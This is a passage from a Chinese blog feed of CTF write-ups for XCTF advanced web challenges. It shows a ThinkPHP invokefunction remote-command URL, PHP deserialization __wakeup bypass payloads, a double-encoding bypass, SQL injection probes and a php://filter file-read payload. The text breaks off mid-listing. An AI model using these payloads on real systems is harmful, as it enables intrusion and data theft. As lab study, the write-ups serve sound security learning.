href="http://111.200.241.244:42333/?s=/index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=cat%20/flag">http://111.200.241.244:42333/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</a></p><h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>进入题目页面<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/6.png" alt="6"></p><p>查看网页源码、回显都没有什么线索，查阅资料得知我们可以通过phps查看php源码。</p><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/7.png" alt="7"></p><p>查看该页面源码：<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/8.png" alt="8"></p><p>代码审计可知，当id=admin时不会爆flag，但是当admin经过编码后可得flag</p><p>由于本关url解码了两次（浏览器上传服务器一次，urldecode函数一次），因此我们可以构造?id=%2561dmin</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/9.png" alt="9"></p><h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06:"></a>ics-06:</h1><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/10.png" alt="10"></p><p>我们根据题目提示打开报表中心<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/11.png" alt="11"></p><p>我们可以看到id=1，那会不会是参数有问题呢</p><p>用burp抓包，对id进行爆破，发现当id=2333时爆出flag<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/12.png" alt="12"></p><p>但是这题有一点不明白，就是为什么题目说：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。为什么痕迹是id的值？</p><h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>参考<a href="https://blog.csdn.net/weixin_45844670/article/details/108180309">https://blog.csdn.net/weixin_45844670/article/details/108180309</a></p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>参考<a href="https://blog.csdn.net/yybzzz/article/details/104971608">https://blog.csdn.net/yybzzz/article/details/104971608</a></p><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>恶补了一下反序列化操作与序列序列化操作。参考资料：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/93884388">https://blog.csdn.net/weixin_44677409/article/details/93884388</a></p><p>我这边就简单的概括一下：</p><p>序列化——将变量或对象转换成字符串的过程。</p><p>反序列化——将字符串转换成变量或对象的过程。</p><p>如图序列化后!<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/image-20210522104411424.png" alt="image-20210522104411424"></p><p><strong>魔术方法（）：</strong></p><p>_construct()：创建对象时初始化<br>_destruction()：结束时销毁对象<br>_toString()：对象被当作字符串时使用<br>_sleep()：序列化对象之前调用<br>_wakeup()：反序列化对象之前调用<br>_call()：调用对象不存在时使用<br>_get()：调用私有属性时使用</p><p>注：</p><p>1.的魔术方法必须声明为 <code>public</code></p><p>2.public属性序列化后格式为：数据类型:属性名长度:”属性名”。</p><p>了解了上述这些我们就可以开始答题啦</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/13.png" alt="13"></p><p>我们看到<code>wakeup()</code>函数，再结合题目<code>unseriasize3</code>可以得知这是一道反序列化操作的题，</p><p>根据前两行代码可知存在一个数组名<code>xctf</code>，键数<code>1</code>，键名<code>flag</code>，键值<code>111</code>的数组，</p><p>在__wakeup()魔术方法中，在反序列化前会自动调用 _wakeup方法，强制输出<code>bad requests</code>，因此我们要绕过之</p><p><strong>解题关键：当序列化字符串中表示对象属性个数（键数）的值大于实际的属性个数（键数）时会跳过__wakeup的执行</strong></p><p>构造字符串<code>?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>绕过__wakeup方法</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/15.png" alt="15"></p><h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><p>打开题目地址发现是SQL注入的题，先拿sqlmap跑了一下，发现只能跑出数据库名，再下去就跑不动了，于是只能回来乖乖手工注入。</p><p>输入<code>1&#39;</code>报错<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/16.png" alt="16"></p><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>，正常；</p><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>，异常；</p><p>因此注入类型为<code>&#39;</code>。</p><p>尝试union联合注入，发现过滤了许多单词</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/17.png" alt="17"></p><p>因此避免使用含<code>select</code>语句的方式好像也只有堆叠注入了</p><p>参考博客：<a href="https://blog.csdn.net/rfrder/article/details/108583338">https://blog.csdn.net/rfrder/article/details/108583338</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;baby-web&quot;&gt;&lt;a href=&quot;#baby-web&quot; class=&quot;headerlink&quot; title=&quot;baby_web&quot;&gt;&lt;/a&gt;baby_web&lt;/h1&gt;&lt;p&gt;我们点击题目场景，发现跳转到1.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/03/</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web进阶</title>
    <link href="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/"/>
    <id>http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/</id>
    <published>2021-03-12T09:23:20.000Z</published>
    <updated>2021-04-17T02:40:04.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><h1 id="Web-php-unserialize：（反序列化）"><a href="#Web-php-unserialize：（反序列化）" class="headerlink" title="Web_php_unserialize：（反序列化）"></a>Web_php_unserialize：（反序列化）</h1><p>打开题目地址，就看到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则表达式：<code>&#39;/[oc]:\d+:/i&#39;</code></p><p><strong>/XXXX/</strong>      ——  php的正则表达式需要放在<code>//</code> 之间</p><p><strong>i</strong>                  ——修饰符，表示忽略大小写</p><p><strong>[oc]</strong>             ——匹配o和c: </p><p><strong>\d</strong>                ——匹配一个数字</p><p><strong>\d+</strong>              ——匹配多个数字</p><p>代码审计：服务器get获得var的值，先对var的值base64解码，然后正则匹配判断是否存在<code>O：数字</code>或<code>C：数字</code>，若不存在则在反序列之前执行__wakeup()魔术方法。</p><p>那么我们需要绕过正则匹配和__wakeup()</p><p><code>O:+4:</code>——绕过正则匹配</p><p>O:+4:”Demo”:<strong>1</strong>:{s:10:”Demofile”;s:8:”fl4g.php”;}——把1换成2绕过__wakeup()</p><p>最后对payload进行base64encode，得：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p><p>最后有一个问题没搞懂：“Demofile”只有8位，而前面字段却写了10，这是因为private型变量序列化之后会变成“\x00 + 类名 + \x00 + 变量名”形式。？？？？？？？？？？？？？？？？？？？</p><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==         错</p><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==        对</p><h1 id="NaNNaNNaNNaN-Batman：（alert函数-代码审计）"><a href="#NaNNaNNaNNaN-Batman：（alert函数-代码审计）" class="headerlink" title="NaNNaNNaNNaN-Batman：（alert函数+代码审计）"></a>NaNNaNNaNNaN-Batman：（alert函数+代码审计）</h1><p>下载附件1<code>web100.txt</code>，打开发现是乱码<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/1.png" alt="1"></p><p>用浏览器打开，发现一个输入框</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/2.png" alt="2"></p><p>但是输入什么都没反应，查阅资料：</p><p>eval函数，这是执行函数；这里执行了<code>_</code>变量中的内容(<code>_</code>等于$函数的内容,也就是单引号之间内容)，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/3.png" alt="3"></p><p>整理得：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">if(e.match(/^be0f23/)!=null)</span><br><span class="line">if(e.match(/233ac/)!=null)</span><br><span class="line">if(e.match(/e98aa$/)!=null)</span><br><span class="line">if(e.match(/c7be9/)!=null)</span><br><span class="line">&#123;</span><br><span class="line">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">var s=[t,n,r,i];</span><br><span class="line">for(var o=0;o<span class="tag">&lt;<span class="name">13;++o)&#123;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">document.write</span>(<span class="attr">s</span>[<span class="attr">o</span>%<span class="attr">4</span>][<span class="attr">0</span>]);<span class="attr">s</span>[<span class="attr">o</span>%<span class="attr">4</span>]<span class="attr">.splice</span>(<span class="attr">0</span>,<span class="attr">1</span>)&#125;</span></span><br><span class="line"><span class="tag">      &#125;</span></span><br><span class="line"><span class="tag">      &#125;</span></span><br><span class="line">      document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure><ul><li><p>新函数：</p><p><strong>splice()</strong> </p><p>功能：从数组中添加/删除项目，然后返回被删除的项目。</p><p>语法：<code>arrayObject.splice(index,howmany,item1,.....,itemX)</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">index</td><td align="left">必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</td></tr><tr><td align="left">howmany</td><td align="left">必需。要删除的项目数量。如果设置为 0，则不会删除项目。</td></tr><tr><td align="left">item1, …, itemX</td><td align="left">可选。向数组添加的新项目。</td></tr></tbody></table></li></ul><p>法1：输入符合条件的<code>e</code>，令其执行后续代码</p><ul><li><p>正则表达式：</p><p>^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求<br>于是我们构造e的值：<code>be0f233ac7be98aa</code></p></li></ul><p>在输入框内输入e的值：</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/image-20210327221653190.png" alt="image-20210327221653190"></p><p>法2：直接看后半段源码，循环推理也可得e的值。但是我感觉有点麻烦。</p><h1 id="web2：（解码）"><a href="#web2：（解码）" class="headerlink" title="web2：（解码）"></a>web2：（解码）</h1><p>点开题目地址：</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/Users/Lenovo\Desktop\blog\hexo\source_posts\攻防世界web进阶2\4.png" alt="4"></p><p>发现这是一道解码题，只要解出miwen的值，就得到flag</p><ul><li><p>新函数：</p><p><strong>strrev()函数：</strong></p><p>功能：反转字符串。</p><p>语法：strrev(string)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要反转的字符串。</td></tr></tbody></table></li></ul><p>  <strong>ord()函数：</strong></p><p>  功能：以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值。即一个返回一个对应的十进制数。</p><p>  语法：ord(c)</p><p>  <strong>char()函数：</strong></p><p>  功能：根据指定的 ASCII 值返回字符。（ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。）</p><p>  语法：chr(ascii)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>ascii</em></td><td>必需。ASCII 值。</td></tr></tbody></table><p>  <strong>str_rot13()函数：</strong></p><p>  功能：对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</p><p>  语法：str_rot13(string)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要编码的字符串。</td></tr></tbody></table><p>  sp：对字符串解码和编码都是同一个函数</p><p>代码审计：先反转字符串，然后对字符串每个字母对应的ascll码值加一，再找到加值对应的ascll码，把每个字符再拼接成一个字符串，</p><p>然后对该字符串依次进行base64编码、反转、 ROT13 编码，结果就是输出的miwen的值。</p><p>据此我们可以编写一段php代码进行解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line"></span><br><span class="line">$_o=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_);$_0++)&#123;  </span><br><span class="line">     </span><br><span class="line">    $_c=substr($_,$_0,<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">    $__=ord($_c)<span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">    $_c=chr($__);  </span><br><span class="line"></span><br><span class="line">    $_o=$_o.$_c;   </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> strrev($_o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/Users/Lenovo\Desktop\blog\hexo\source_posts\攻防世界web进阶2\5.png" alt="5"></p><h1 id="ics-05：（http-filter利用-preg-replace-函数漏洞利用）"><a href="#ics-05：（http-filter利用-preg-replace-函数漏洞利用）" class="headerlink" title="ics-05：（http://filter利用+preg_replace()函数漏洞利用）"></a>ics-05：（<code>http://filter</code>利用+preg_replace()函数漏洞利用）</h1><p>我们看到题目描述：<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/Users/Lenovo\Desktop\blog\hexo\source_posts\攻防世界web进阶2\6.png" alt="6"></p><p>点开题目地址，找到设备维护中心<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/Users/Lenovo\Desktop\blog\hexo\source_posts\攻防世界web进阶2\7.png" alt="7"></p><p>发现是文件包含，尝试用php://filter读取index.php源码：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B62/Users/Lenovo\Desktop\blog\hexo\source_posts\攻防世界web进阶2\8.png" alt="8"></p><p>对获得的字符串进行base64-decode，得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;云平台设备维护中心&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;&#x2F;legend&gt;</span><br><span class="line">    &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;开|关&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;table&#39;, function() &#123;</span><br><span class="line">        var table &#x3D; layui.table,</span><br><span class="line">            form &#x3D; layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#39;#test&#39;,</span><br><span class="line">            url: &#39;&#x2F;somrthing.json&#39;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#39;numbers&#39; &#125;,</span><br><span class="line">                     &#123; type: &#39;checkbox&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;name&#39;, title: &#39;设备名&#39;, templet: &#39;#nameTpl&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;area&#39;, title: &#39;区域&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;status&#39;, title: &#39;维护状态&#39;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;check&#39;, title: &#39;设备开关&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;element&#39;, function() &#123;</span><br><span class="line">        var element &#x3D; layui.element; &#x2F;&#x2F;导航的hover效果、二级菜单等功能，需要依赖element模块</span><br><span class="line">        &#x2F;&#x2F;监听导航点击</span><br><span class="line">        element.on(&#39;nav(demo)&#39;, function(elem) &#123;</span><br><span class="line">            &#x2F;&#x2F;console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page &#x3D; $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt;</span><br><span class="line"> 